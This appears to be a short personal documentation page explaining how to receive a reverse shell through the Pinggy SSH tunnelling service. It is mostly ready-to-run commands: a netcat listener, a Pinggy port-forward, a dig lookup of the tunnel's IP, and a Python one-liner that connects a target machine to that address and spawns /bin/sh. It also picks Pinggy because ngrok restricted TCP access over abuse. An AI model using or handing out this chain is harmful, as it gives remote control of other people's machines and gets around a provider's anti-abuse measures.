---
title: Reverse shell using pinggy.io
---

## What

This document gives you an overview of how to run a reverse shell using pinggy

Pinggy is a reverse proxy service that works over SSH

The reason we use Pinggy over Ngrok is because ngrok now requires a credit card on file for TCP connections as it was being...
_surprise_ **Abused**

## How

Start a netcat session in a terminal window, listening on port 443

```shell
nc -lnvk 443
```

Open a new shell window and run the pinggy command

```shell
ssh -p 443 -R0:localhost:443 tcp@a.pinggy.io
```

This will port forward port 443 to your local laptop over their network (via SSH)

You will see a screen with the below

```text
tcp://rnxye-79-173-162-90.a.free.pinggy.link:46745
```

Get the IP address of the Pinggy endpoint

```shell
dig A rnxye-79-173-162-90.a.free.pinggy.link
```

??? note "Example output from dig"

    ```shell
    ➜ dig A rnhhh-79-173-162-90.a.free.pinggy.link

    ; <<>> DiG 9.10.6 <<>> A rnhhh-79-173-162-90.a.free.pinggy.link
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45520
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4096
    ;; QUESTION SECTION:
    ;rnhhh-79-173-162-90.a.free.pinggy.link.        IN A

    ;; ANSWER SECTION:
    rnhhh-79-173-162-90.a.free.pinggy.link. 10 IN CNAME lin.europe.3.a.pinggy.click.
    lin.europe.3.a.pinggy.click. 600 IN     A       172.232.216.95

    ;; Query time: 232 msec
    ;; SERVER: 127.0.2.2#53(127.0.2.2)
    ;; WHEN: Thu Jan 09 11:22:34 GMT 2025
    ;; MSG SIZE  rcvd: 124
    ```

    In this example we want to use `172.232.216.95`

Modify your reverse shell command to use the port from Pinggy and the IP address

In the example, our pinggy string was `tcp://rnxye-79-173-162-90.a.free.pinggy.link:46745` so we need to use port `46745`

```shell
export RHOST="172.232.216.95";export RPORT=46745;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

For more reverse shell examples, see [InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/?utm_source=documentation.breadnet.co.uk/security/reverse-shell-using-pinggy&utm_medium=documentation.breadnet.co.uk/security/reverse-shell-using-pinggy&utm_campaign=documentation.breadnet.co.uk/security/reverse-shell-using-pinggy#python)
